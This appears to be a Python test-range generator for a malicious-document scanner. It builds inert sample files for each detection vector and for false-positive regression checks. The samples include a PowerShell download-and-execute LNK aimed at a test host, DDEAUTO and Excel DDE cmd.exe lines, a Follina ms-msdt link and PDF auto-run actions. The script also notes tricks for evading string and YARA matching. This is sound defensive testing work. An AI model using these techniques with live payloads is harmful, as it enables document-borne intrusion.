#!/usr/bin/env python3
"""
DocScan test range generator.

Creates BENIGN test documents, one per detection vector, so we can walk every
docscan vector (and a real vendor-family signature) end-to-end. Nothing here has
a working payload — macros only assign inert strings; URLs point to test hosts.

Run:  python3 gen_test_range.py [out_dir]   (default: ./range)
"""
import os, sys, struct, zipfile

OUT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(__file__), "range")
os.makedirs(OUT, exist_ok=True)

TEST_URL = "http://malware-test.local:8080"   # benign test host, never resolved

# ---------- minimal OOXML (docx) ----------
CONTENT_TYPES = (
    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '</Types>')
ROOT_RELS = (
    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
    '</Relationships>')
DOC_XML = ('<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
           '<w:body><w:p><w:r><w:t>DocScan benign test document.</w:t></w:r></w:p></w:body></w:document>')

def write_docx(name, extra):
    """extra: dict of {zip_path: bytes}. Adds base OOXML parts + extras."""
    parts = {
        "[Content_Types].xml": CONTENT_TYPES.encode(),
        "_rels/.rels": ROOT_RELS.encode(),
        "word/document.xml": DOC_XML.encode(),
    }
    parts.update(extra)
    p = os.path.join(OUT, name)
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        for path, data in parts.items():
            z.writestr(path, data)
    return p

def write_xlsx(name, sheet_cells, ddelink=None):
    """Minimal valid workbook: one sheet; optional external DDE link part."""
    SS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
    R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    ct = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
          '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
          '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
          '<Default Extension="xml" ContentType="application/xml"/>'
          '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
          '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
          + ('<Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>' if ddelink else '')
          + '</Types>')
    root = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="%s/officeDocument" Target="xl/workbook.xml"/></Relationships>' % R)
    wb = ('<?xml version="1.0"?><workbook xmlns="%s" xmlns:r="%s"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>'
          + ('<externalReferences><externalReference r:id="rId2"/></externalReferences>' if ddelink else '')
          + '</workbook>') % (SS, R)
    wbrels = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
              '<Relationship Id="rId1" Type="%s/worksheet" Target="worksheets/sheet1.xml"/>' % R
              + ('<Relationship Id="rId2" Type="%s/externalLink" Target="externalLinks/externalLink1.xml"/>' % R if ddelink else '')
              + '</Relationships>')
    sheet = '<?xml version="1.0"?><worksheet xmlns="%s"><sheetData><row r="1">%s</row></sheetData></worksheet>' % (SS, sheet_cells)
    parts = {"[Content_Types].xml": ct, "_rels/.rels": root, "xl/workbook.xml": wb,
             "xl/_rels/workbook.xml.rels": wbrels, "xl/worksheets/sheet1.xml": sheet}
    if ddelink:
        parts["xl/externalLinks/externalLink1.xml"] = (
            '<?xml version="1.0"?><externalLink xmlns="%s">%s</externalLink>' % (SS, ddelink))
    with zipfile.ZipFile(os.path.join(OUT, name), "w", zipfile.ZIP_DEFLATED) as z:
        for path, data in parts.items():
            z.writestr(path, data.encode())

def rels(entries):
    """entries: list of (type_suffix, target, mode)."""
    body = ['<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">']
    for i, (typ, target, mode) in enumerate(entries, 1):
        m = ' TargetMode="%s"' % mode if mode else ''
        body.append('<Relationship Id="r%d" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/%s" Target="%s"%s/>' % (i, typ, target, m))
    body.append('</Relationships>')
    return "".join(body).encode()

# ---------- MS-OVBA (one uncompressed chunk) ----------
def ovba_container(text: bytes) -> bytes:
    n = len(text)
    assert n <= 4096
    header = ((n - 1) & 0x0FFF) | 0x3000   # sig=3, uncompressed (flag bit15=0)
    return b"\x01" + struct.pack("<H", header) + text

# ---------- minimal CFB (v3, 512-byte sectors) with one stream ----------
ENDOFCHAIN = 0xFFFFFFFE
FREESECT   = 0xFFFFFFFF
FATSECT    = 0xFFFFFFFD

def _dir_entry(name, obj_type, start, size):
    e = bytearray(128)
    nb = name.encode("utf-16-le") + b"\x00\x00"
    e[0:len(nb)] = nb
    struct.pack_into("<H", e, 64, len(nb))
    e[66] = obj_type
    e[67] = 1
    struct.pack_into("<i", e, 68, -1)
    struct.pack_into("<i", e, 72, -1)
    struct.pack_into("<i", e, 76, -1)
    struct.pack_into("<i", e, 116, start)
    struct.pack_into("<I", e, 120, size & 0xFFFFFFFF)
    return bytes(e)

def build_cfb(stream: bytes, name: str = "Module1") -> bytes:
    SEC = 512
    data = stream
    if len(data) < 4097:                       # >= mini cutoff -> big sectors
        data += b"\x00" * (4097 - len(data))
    if len(data) % SEC:
        data += b"\x00" * (SEC - len(data) % SEC)
    nsec = len(data) // SEC
    data_start = 2
    last = data_start + nsec - 1

    h = bytearray(512)
    h[0:8] = bytes([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
    struct.pack_into("<H", h, 24, 0x3E)
    struct.pack_into("<H", h, 26, 3)
    struct.pack_into("<H", h, 28, 0xFFFE)
    struct.pack_into("<H", h, 30, 9)     # 512-byte sectors
    struct.pack_into("<H", h, 32, 6)     # 64-byte mini sectors
    struct.pack_into("<I", h, 44, 1)     # num FAT sectors
    struct.pack_into("<i", h, 48, 1)     # first dir sector
    struct.pack_into("<I", h, 56, 4096)  # mini stream cutoff
    struct.pack_into("<i", h, 60, -2)    # first mini FAT = ENDOFCHAIN
    struct.pack_into("<i", h, 68, -2)    # first DIFAT = ENDOFCHAIN
    for i in range(109):
        struct.pack_into("<I", h, 76 + i * 4, 0 if i == 0 else FREESECT)

    fat = [FREESECT] * 128
    fat[0] = FATSECT
    fat[1] = ENDOFCHAIN
    for s in range(data_start, last):
        fat[s] = s + 1
    fat[last] = ENDOFCHAIN
    fatsec = b"".join(struct.pack("<I", x & 0xFFFFFFFF) for x in fat)

    dirsec = (_dir_entry("Root Entry", 5, -2, 0)
              + _dir_entry(name, 2, data_start, len(stream) if len(stream) >= 4097 else len(data))
              + bytes(128) + bytes(128))

    return bytes(h) + fatsec + dirsec + data

def vba_project(src_text: str) -> bytes:
    return build_cfb(ovba_container(src_text.encode("latin-1")))

# ---------- generators per vector ----------
def gen():
    created = []

    # 1. RTF \objupdate
    rtf = r"{\rtf1\ansi {\object\objupdate\objemb {\*\objdata 0105}}}"
    open(os.path.join(OUT, "rtf_objupdate.rtf"), "w").write(rtf)
    created.append("rtf_objupdate.rtf")

    # 2. PDF auto-JS (OpenAction + JavaScript + dangerous API)
    pdf = ("%%PDF-1.5\n1 0 obj<</OpenAction<</S/JavaScript/JS(app.launchURL('%s'))>>>>endobj\n"
           "trailer<</Root 1 0 R>>\n%%%%EOF" % TEST_URL)
    open(os.path.join(OUT, "pdf_js_auto.pdf"), "w").write(pdf)
    created.append("pdf_js_auto.pdf")

    # 3. PDF /Launch
    pdf2 = "%PDF-1.5\n1 0 obj<</OpenAction<</S/Launch/F(cmd.exe)>>>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF"   # not %-formatted: a literal %%EOF
    open(os.path.join(OUT, "pdf_launch.pdf"), "w").write(pdf2)
    created.append("pdf_launch.pdf")

    # 4. Remote Template (settings.xml.rels external attachedTemplate)
    write_docx("remote_template.docx", {
        "word/_rels/settings.xml.rels": rels([("attachedTemplate", TEST_URL + "/t.dotx", "External")]),
        "word/settings.xml": b'<?xml version="1.0"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
    })
    created.append("remote_template.docx")

    # 5. Follina / protocol handler (ms-msdt:)
    write_docx("protocol_handler.docx", {
        "word/_rels/document.xml.rels": rels([("oleObject", "ms-msdt:/id PCWDiagnostic /skip force /param TEST", "External")]),
    })
    created.append("protocol_handler.docx")

    # 6. DDEAUTO in document.xml
    dde_doc = ('<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
               '<w:body><w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\Windows\\\\System32\\\\notepad.exe TEST "/></w:p></w:body></w:document>')
    write_docx("dde_auto.docx", {"word/document.xml": dde_doc.encode()})
    created.append("dde_auto.docx")

    # 6b. DDE (not AUTO) with a command -> needs the user to accept the update prompt
    dde_link = dde_doc.replace(" DDEAUTO c:", " DDE c:").replace("notepad.exe TEST", "cmd.exe /c notepad.exe TEST")
    write_docx("dde_link.docx", {"word/document.xml": dde_link.encode()})
    created.append("dde_link.docx")

    # 6c. DDEAUTO split over two <w:instrText> runs (evades a plain string search)
    W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
    split = ('<?xml version="1.0"?><w:document %s><w:body><w:p>'
             '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
             '<w:r><w:instrText xml:space="preserve"> DDE</w:instrText></w:r>'
             '<w:r><w:instrText xml:space="preserve">AUTO c:\\Windows\\System32\\cmd.exe "/c notepad.exe" </w:instrText></w:r>'
             '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>TEST</w:t></w:r>'
             '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
             '</w:p></w:body></w:document>') % W
    write_docx("dde_split.docx", {"word/document.xml": split.encode()})
    created.append("dde_split.docx")

    # 6d/6e. Excel DDE: a formula cmd|'..'!A0, and an external <ddeLink>
    write_xlsx("excel_dde_formula.xlsx",
               sheet_cells='<c r="A1"><f>cmd|\' /C notepad.exe\'!A0</f><v>0</v></c>')
    created.append("excel_dde_formula.xlsx")
    write_xlsx("excel_ddelink.xlsx", sheet_cells='<c r="A1"><v>1</v></c>',
               ddelink='<ddeLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                       'ddeService="cmd" ddeTopic="/c notepad.exe"><ddeItems>'
                       '<ddeItem name="A0" advise="1"/></ddeItems></ddeLink>')
    created.append("excel_ddelink.xlsx")

    # 7. External OLE (MEDIUM)
    write_docx("external_ole.docx", {
        "word/_rels/document.xml.rels": rels([("oleObject", TEST_URL + "/o.bin", "External")]),
    })
    created.append("external_ole.docx")

    # 8. Embedded PE (MZ..PE stub inside embeddings/oleObject1.bin)
    mz = bytearray(0x100)
    mz[0:2] = b"MZ"
    struct.pack_into("<I", mz, 0x3C, 0x80)        # e_lfanew
    mz[0x80:0x84] = b"PE\x00\x00"
    write_docx("embedded_pe.docx", {"word/embeddings/oleObject1.bin": bytes(mz)})
    created.append("embedded_pe.docx")

    # 9. Embedded LNK (LNK signature inside embeddings/oleObject1.bin)
    lnk_sig = bytes([0x4C,0,0,0,0x01,0x14,0x02,0,0,0,0,0,0xC0,0,0,0,0,0,0,0x46])
    write_docx("embedded_lnk.docx", {"word/embeddings/oleObject1.bin": lnk_sig + bytes(64)})
    created.append("embedded_lnk.docx")

    # 10. Malicious LNK (lolbin + url args + obfuscation)
    open(os.path.join(OUT, "lnk_lolbin.lnk"), "wb").write(build_lnk(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('%s/a.ps1')" % TEST_URL))
    created.append("lnk_lolbin.lnk")

    # 11. Suspicious macro (benign body, inert strings)
    src1 = ('Attribute VB_Name = "Module1"\r\n'
            'Sub AutoOpen()\r\n'
            '    Dim s As String\r\n'
            '    s = "powershell"\r\n'
            '    s = "DownloadFile"\r\n'
            '    s = "CreateObject"\r\n'
            "    ' inert test - no execution\r\n"
            'End Sub\r\n')
    write_docx("macro_suspicious.docm", {"word/vbaProject.bin": vba_project(src1)})
    created.append("macro_suspicious.docm")

    # 12. Vendor-signature macro (triggers gen_macro_ShellExecute_action; inert)
    src2 = ('Attribute VB_Name = "Module1"\r\n'
            'Sub AutoOpen()\r\n'
            '    Dim t As String\r\n'
            '    t = "ShellExecute"\r\n'
            '    t = "GetObject"\r\n'
            '    t = "00A0C91F3880"\r\n'
            '    t = "C08AFD90"\r\n'
            "    ' inert test - no execution\r\n"
            'End Sub\r\n')
    write_docx("vendor_shellexec.docm", {"word/vbaProject.bin": vba_project(src2)})
    created.append("vendor_shellexec.docm")

    created += gen_objects()
    created += gen_vba_projects()

    return created

# ---------- embedded objects (step 4): inert, no exploit, no executable code ----------
def ole10native(label, path, payload):
    """OLE Package native data: flags, label, path, 0x0003, temp path, payload."""
    body = (struct.pack("<H", 2) + label.encode() + b"\x00" + path.encode() + b"\x00"
            + struct.pack("<H", 3) + struct.pack("<I", len(path) + 1) + path.encode() + b"\x00"
            + struct.pack("<I", len(payload)) + payload)
    return struct.pack("<I", len(body)) + body

def ole1_object(class_name, native):
    """RTF \\objdata: OLE1 object header (embedded) + native data, as hex."""
    cn = class_name.encode() + b"\x00"
    b = (struct.pack("<II", 0x0501, 2) + struct.pack("<I", len(cn)) + cn
         + struct.pack("<I", 0) + struct.pack("<I", 0) + struct.pack("<I", len(native)) + native)
    return b.hex()

def gen_objects():
    out = []
    # 13. Equation Editor 3.0 object in a docx (stream "Equation Native", no exploit bytes)
    write_docx("equation_ole.docx", {"word/embeddings/oleObject1.bin":
               build_cfb(b"\x1c\x00" + bytes(30), "Equation Native")})
    out.append("equation_ole.docx")
    # 14. OLE Package carrying a .vbs (content is a comment line)
    pkg = ole10native("invoice.vbs", r"C:\Temp\invoice.vbs", b"' docscan inert test\r\n")
    write_docx("package_script.docx", {"word/embeddings/oleObject1.bin":
               build_cfb(pkg, "\x01Ole10Native")})
    out.append("package_script.docx")
    # 15. ActiveX control (Shell.Explorer / WebBrowser CLSID) in a docx
    write_docx("activex_control.docx", {"word/activeX/activeX1.xml":
               b'<?xml version="1.0"?><ax:ocx ax:classid="{8856F961-340A-11D0-A96B-00C04FD705A2}" '
               b'ax:persistence="persistPropertyBag" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX"/>'})
    out.append("activex_control.docx")
    # 16. altChunk: document.xml.rels -> afchunk.rtf (benign RTF)
    write_docx("altchunk.docx", {
        "word/_rels/document.xml.rels": (
            '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" '
            'Target="afchunk.rtf"/></Relationships>').encode(),
        "word/afchunk.rtf": b"{\\rtf1 DocScan altChunk test}"})
    out.append("altchunk.docx")
    # 17. Excel 4.0 macro sheet in an xlsm (no formulas)
    write_xlsx("xlm_macrosheet.xlsm", sheet_cells='<c r="A1"><v>1</v></c>')
    p = os.path.join(OUT, "xlm_macrosheet.xlsm")
    with zipfile.ZipFile(p, "a") as z:
        z.writestr("xl/macrosheets/sheet1.xml",
                   '<?xml version="1.0"?><xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"/>')
    out.append("xlm_macrosheet.xlsm")
    # 18. RTF with an Equation.3 object (header only)
    open(os.path.join(OUT, "equation.rtf"), "w").write(
        "{\\rtf1{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata "
        + ole1_object("Equation.3", bytes(32)) + "}}}")
    out.append("equation.rtf")
    # 19. RTF with an OLE Package carrying a .vbs
    open(os.path.join(OUT, "package_script.rtf"), "w").write(
        "{\\rtf1{\\object\\objemb{\\*\\objclass Package}{\\*\\objdata "
        + ole1_object("Package", pkg[4:]) + "}}}")
    out.append("package_script.rtf")
    # 20. legacy .xls with an Excel 4.0 macro sheet (BIFF8 BOF + BOUNDSHEET type 1 + EOF)
    bof = struct.pack("<HH", 0x0809, 16) + struct.pack("<HHHHII", 0x0600, 0x0005, 0, 0, 0, 0)
    name = b"Macro1"
    bs_body = struct.pack("<IBB", 0, 0, 0x01) + bytes([len(name), 0]) + name
    bs = struct.pack("<HH", 0x0085, len(bs_body)) + bs_body
    eof = struct.pack("<HH", 0x000A, 0)
    open(os.path.join(OUT, "xlm_macrosheet.xls"), "wb").write(build_cfb(bof + bs + eof, "Workbook"))
    out.append("xlm_macrosheet.xls")
    return out

# ---------- VBA projects shaped like real Excel ones (false-positive regression) ----------
# A real VBA project: one stream per module = [compiled p-code][MS-OVBA source], plus
# _VBA_PROJECT whose identifier table names every procedure ever compiled (Office does
# not clean it when a macro is deleted). The macro bodies come from real business
# workbooks that raised false alerts (PivotTable refresh, no network / shell / files);
# paths, user and author names are left out.

def build_cfb_multi(streams):
    """Minimal CFB v3 with several streams [(name, bytes)]; each stream >= 4097 bytes
    (no mini stream). Directory: Root -> first stream, each stream -> next as right sibling."""
    SEC = 512
    ents = [("Root Entry", 5, b"")] + [(n, 2, d) for n, d in streams]
    ndir = (len(ents) + 3) // 4
    fat = [FREESECT] * 128
    fat[0] = FATSECT
    for i in range(ndir):
        fat[1 + i] = (2 + i) if i < ndir - 1 else ENDOFCHAIN
    sec = 1 + ndir
    body, dirs = b"", b""
    for idx, (name, typ, data) in enumerate(ents):
        e = bytearray(128)
        nb = name.encode("utf-16-le") + b"\x00\x00"
        e[0:len(nb)] = nb
        struct.pack_into("<H", e, 64, len(nb))
        e[66], e[67] = typ, 1                                   # type, black
        struct.pack_into("<i", e, 68, -1)                       # left
        struct.pack_into("<i", e, 72, idx + 1 if 0 < idx < len(ents) - 1 else -1)  # right
        struct.pack_into("<i", e, 76, 1 if idx == 0 and len(ents) > 1 else -1)     # child
        if typ == 5:
            struct.pack_into("<i", e, 116, -2)
        else:
            d = data + b"\x00" * max(0, 4097 - len(data))
            size = len(d)
            d += b"\x00" * ((-len(d)) % SEC)
            n = len(d) // SEC
            for s in range(sec, sec + n - 1):
                fat[s] = s + 1
            fat[sec + n - 1] = ENDOFCHAIN
            struct.pack_into("<i", e, 116, sec)
            struct.pack_into("<I", e, 120, size)
            body += d
            sec += n
        dirs += bytes(e)
    assert sec <= 128, "too many sectors for one FAT sector"
    dirs += b"\x00" * (ndir * SEC - len(dirs))
    h = bytearray(512)
    h[0:8] = bytes([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
    struct.pack_into("<HHHHH", h, 24, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<I", h, 44, 1)      # one FAT sector
    struct.pack_into("<i", h, 48, 1)      # first directory sector
    struct.pack_into("<I", h, 56, 4096)   # mini stream cutoff
    struct.pack_into("<i", h, 60, -2)
    struct.pack_into("<i", h, 68, -2)
    for i in range(109):
        struct.pack_into("<I", h, 76 + i * 4, 0 if i == 0 else FREESECT)
    fatsec = b"".join(struct.pack("<I", x & 0xFFFFFFFF) for x in fat)
    return bytes(h) + fatsec + dirs + body

def vba_module(src, pcode_len):
    """Module stream: pcode_len bytes standing in for compiled p-code, then the source
    (Windows-1251, as Cyrillic Office stores it) in one MS-OVBA chunk."""
    return b"\xAA" * pcode_len + ovba_container(src.replace("\n", "\r\n").encode("cp1251"))

def ovba_multi(text: bytes) -> bytes:
    """MS-OVBA container with several uncompressed chunks (4096 bytes each, the last shorter)."""
    out = b"\x01"
    for i in range(0, len(text), 4096):
        part = text[i:i + 4096]
        out += struct.pack("<H", ((len(part) - 1) & 0x0FFF) | 0x3000) + part
    return out

def vba_identifiers(names):
    """_VBA_PROJECT stand-in: an identifier table (length-prefixed ASCII names)."""
    return b"\xCC\x61\xFF\xFF" + b"".join(bytes([len(n), 0]) + n.encode() for n in names)

SHEET_ATTRS = ('Attribute VB_Name = "{0}"\n'
               'Attribute VB_Base = "0{{00020820-0000-0000-C000-000000000046}}"\n'
               'Attribute VB_GlobalNameSpace = False\nAttribute VB_Creatable = False\n'
               'Attribute VB_PredeclaredId = True\nAttribute VB_Exposed = True\n'
               'Attribute VB_TemplateDerived = False\nAttribute VB_Customizable = True\n')
BOOK_ATTRS = SHEET_ATTRS.replace("00020820", "00020819")

PIKE_CODE = '''Function GetColumnName(colNum As Integer) As String
            Dim d As Integer
            Dim m As Integer
            Dim name As String
            d = colNum
            name = ""
            Do While (d > 0)
                m = (d - 1) Mod 26
                name = Chr(65 + m) + name
                d = Int((d - m) / 26)
            Loop
            GetColumnName = name
        End Function

Private Sub Workbook_Open()

  Application.ScreenUpdating = False
  Dim sName As String
  Dim sFound As Boolean
  sName = "Настройки"
  sFound = False

  On Error Resume Next
        ActiveWorkbook.Sheets(sName).Select
        If Err = 0 Then sFound = True
  On Error GoTo 0

    If sFound <> False Then
            Dim i As Long, n As Long
            Dim rangeName   As String
            Dim rangeSheet  As String
            Dim rangeTop    As Long
            Dim rangeLeft   As Integer
            Dim rangeBottom As Long
            Dim rangeRight  As Integer
            i = 2
            Do While Cells(i, 1) <> ""
               Sheets(sName).Select
               rangeName = Cells(i, 1) + "_X"
               rangeSheet = Cells(i, 2)
               rangeTable = Cells(i, 3)
               rangeTableSheet = Cells(i, 4)

               rangeTop = Cells(i, 5)
               rangeLeft = Cells(i, 6)
               rangeBottom = Cells(i, 7)
               rangeRight = Cells(i, 8)
               If (rangeTop > 0) Then

                 Sheets(rangeSheet).Select
                 ActiveWorkbook.Names.Add name:=rangeName, RefersToR1C1:=Range(Cells(rangeTop, GetColumnName(rangeLeft)), Cells(rangeBottom, GetColumnName(rangeRight)))
                 ActiveWorkbook.Names(rangeName).Comment = "ReCreate"
                 Application.ScreenUpdating = True

                 Dim pt As PivotTable
                 Set pc = ThisWorkbook.PivotCaches.Create(xlDatabase, SourceData:=rangeName)
                 Set pt = ThisWorkbook.Worksheets(rangeTableSheet).PivotTables(rangeTable)
                 pt.ChangePivotCache (pc)
                 pt.RefreshTable
               End If
               i = i + 1
             Loop
             Sheets("Таблица").Select
             ThisWorkbook.Sheets("Таблица").Range("D2").Value = Now

    End If
End Sub
'''

RPT_REFRESH = '''Attribute VB_Name = "Module1"

Sub RptRefresh()

  ThisWorkbook.Worksheets("Таблица").PivotTables("ТаблицаБаланс").RefreshTable
  Sheets("Таблица").Select
  ThisWorkbook.Sheets("Таблица").Range("D2").Value = Now
End Sub
'''

RECORDED = '''Attribute VB_Name = "Module1"
Sub Macros1()
Attribute Macros1.VB_Description = "Макрос записан 25.01.2005"
Attribute Macros1.VB_ProcData.VB_Invoke_Func = " \\n14"
'
' Macros1 Макрос
' Макрос записан 25.01.2005
'
    ThisWorkbook.Sheets("Table").Range("C3").Value = Now
    Sheets("Table").Select
    Range("C11").Select
    ActiveSheet.PivotTables("СводнаяТаблица1").PivotCache.Refresh
End Sub
'''

def xls_with_vba(name, modules, identifiers):
    """Legacy .xls: Workbook stream (BIFF8 BOF/EOF) + module streams + _VBA_PROJECT."""
    bof = struct.pack("<HH", 0x0809, 16) + struct.pack("<HHHHII", 0x0600, 0x0005, 0, 0, 0, 0)
    eof = struct.pack("<HH", 0x000A, 0)
    streams = [("Workbook", bof + eof)] + modules + [("_VBA_PROJECT", vba_identifiers(identifiers))]
    open(os.path.join(OUT, name), "wb").write(build_cfb_multi(streams))
    return name

def gen_vba_projects():
    out = []
    sheets = [("Sheet%d" % k, vba_module(SHEET_ATTRS.format("Лист%d" % k), 800)) for k in (1, 2, 3)]
    book_pike = ("ThisWorkbook", vba_module(BOOK_ATTRS.format("ЭтаКнига") + PIKE_CODE, 2600))
    book_empty = ("ThisWorkbook", vba_module(BOOK_ATTRS.format("ЭтаКнига"), 1100))
    base_ids = ["ЭтаКнига", "Лист1", "Лист2", "Лист3", "Workbook", "Worksheet"]

    # 21. Business report: Workbook_Open refreshes PivotTables (real false alert) -> MEDIUM
    out.append(xls_with_vba("macro_pike_report.xls", [book_pike] + sheets,
                            base_ids + ["Workbook_Open", "GetColumnName", "colNum", "rangeName"]))
    # 22. The same report received by mail (+ a module with a plain refresh procedure), xlsm -> MEDIUM
    write_xlsx("macro_pike_mail.xlsm", sheet_cells='<c r="A1"><v>1</v></c>')
    with zipfile.ZipFile(os.path.join(OUT, "macro_pike_mail.xlsm"), "a") as z:
        z.writestr("xl/vbaProject.bin", build_cfb_multi(
            [("Module1", vba_module(RPT_REFRESH, 700)), book_pike] + sheets[:1]
            + [("_VBA_PROJECT", vba_identifiers(base_ids + ["Module1", "RptRefresh", "Workbook_Open"]))]))
    out.append("macro_pike_mail.xlsm")
    # 23. Recorded macro (PivotCache.Refresh), no auto-run -> MEDIUM (it is real code)
    out.append(xls_with_vba("macro_recorded.xls", sheets[:2] + [("Module1", vba_module(RECORDED, 900)), book_empty],
                            base_ids + ["Module1", "Macros1"]))
    # 24. Only empty sheet modules (Excel keeps a VBA project with no code) -> no finding (INFO)
    out.append(xls_with_vba("macro_empty_modules.xls", [book_empty] + sheets[:1], base_ids))
    # 25. A deleted macro: empty modules, but the identifier table still names Workbook_Open -> INFO
    out.append(xls_with_vba("macro_deleted.xls", [book_empty] + sheets,
                            base_ids + ["Module1", "Workbook_Open", "SendKeys"]))
    # 26. VBA stomping (synthetic): no source, sizeable p-code, Workbook_Open in the table -> MACRO_STOMPED
    out.append(xls_with_vba("macro_stomped.xls",
                            [("ThisWorkbook", vba_module(BOOK_ATTRS.format("ЭтаКнига"), 3600))] + sheets[:1],
                            base_ids + ["Workbook_Open"]))
    # 27. The dangerous call deep in a long module: ~5 KB of harmless code first, then an
    #     inert "Shell" string. YARA "matches" only tries the first 4 KB of a string, so
    #     the policy must see it through docscan.vba_lines -> HIGH (MACRO_SUSPICIOUS).
    filler = "".join("Sub Fill%03d()\n    Range(\"A%d\").Value = %d\nEnd Sub\n" % (k, k + 1, k)
                     for k in range(120))
    deep = ('Attribute VB_Name = "Module1"\n' + filler +
            'Sub Workbook_Open()\n    Dim s As String\n    s = "Shell"\n    \' inert test - no execution\nEnd Sub\n')
    src = deep.replace("\n", "\r\n").encode("cp1251")
    assert len(src) > 5000
    write_docx("macro_deep_shell.docm", {"word/vbaProject.bin": build_cfb_multi(
        [("Module1", b"\xAA" * 900 + ovba_multi(src)),
         ("_VBA_PROJECT", vba_identifiers(["Module1", "Workbook_Open", "Fill000"]))])})
    out.append("macro_deep_shell.docm")
    return out

# ---------- minimal LNK ----------
def build_lnk(target, args):
    HEADER_SIZE = 0x4C
    flags = 0x02 | 0x20          # HasLinkInfo | HasArguments (ANSI)
    h = bytearray(HEADER_SIZE)
    struct.pack_into("<I", h, 0, HEADER_SIZE)
    # LinkCLSID 00021401-0000-0000-C000-000000000046
    h[4:20] = bytes([0x01,0x14,0x02,0,0,0,0,0,0xC0,0,0,0,0,0,0,0x46])
    struct.pack_into("<I", h, 0x14, flags)

    # LinkInfo: header(28) + LocalBasePath (ANSI, NUL-terminated)
    path = target.encode("latin-1") + b"\x00"
    lbp_off = 28
    li_size = lbp_off + len(path)
    li = bytearray(li_size)
    struct.pack_into("<I", li, 0, li_size)     # LinkInfoSize
    struct.pack_into("<I", li, 4, 28)          # LinkInfoHeaderSize
    struct.pack_into("<I", li, 8, 1)           # flags: VolumeIDAndLocalBasePath
    struct.pack_into("<I", li, 16, lbp_off)    # LocalBasePathOffset
    li[lbp_off:lbp_off + len(path)] = path

    # StringData: COMMAND_LINE_ARGUMENTS (ANSI): 2-byte char count + chars
    a = args.encode("latin-1")
    sd = struct.pack("<H", len(a)) + a

    return bytes(h) + bytes(li) + sd

if __name__ == "__main__":
    files = gen()
    print("created %d test documents in %s:" % (len(files), OUT))
    for f in files:
        print("  " + f)
